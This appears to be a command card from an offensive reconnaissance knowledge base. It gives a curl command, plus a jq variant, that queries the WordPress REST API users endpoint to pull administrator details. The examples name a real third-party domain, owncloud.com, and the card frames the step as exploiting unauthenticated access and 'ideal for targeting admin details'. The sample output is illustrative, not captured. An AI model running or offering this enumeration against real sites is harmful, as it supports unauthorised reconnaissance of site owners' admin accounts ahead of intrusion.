---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: 'curl -s https://owncloud.com/wp-json/wp/v2/users/1'
tags:
  - recon
  - http
  - wordpress
type: command
output: >-
  JSON object for the specific user, e.g.,
  {"id":1,"name":"Admin","description":"Site administrator",...}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:11.082Z'
verified: false
validated: true
submitted: true
---
# curl-get-user-id

## Command

```bash
curl -s https://owncloud.com/wp-json/wp/v2/users/1
```

## Description

This curl command retrieves detailed information for a specific user ID via the WordPress REST API, exploiting unauthenticated access in vulnerable versions. Ideal for targeting admin details after enumeration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| `https://owncloud.com/wp-json/wp/v2/users/1` | Endpoint with user ID (replace URL and ID) | Yes |

## Examples

### Basic Usage

```bash
curl -s https://example.com/wp-json/wp/v2/users/1
```

### Advanced Usage

```bash
curl -s https://owncloud.com/wp-json/wp/v2/users/1 | jq '.name, .description'
```

## Expected Output

Detailed user JSON: {"id":1,"name":"Admin User","url":"","description":"Administrator of the site.","link":"https://owncloud.com/author/admin/","slug":"admin","avatar_urls":{...},"meta":[],"_links":{...}}

## Related

- [[commands/curl-get-users]]
- [[procedures/Retrieve-Specific-User-Details-via-WordPress-REST-API]]
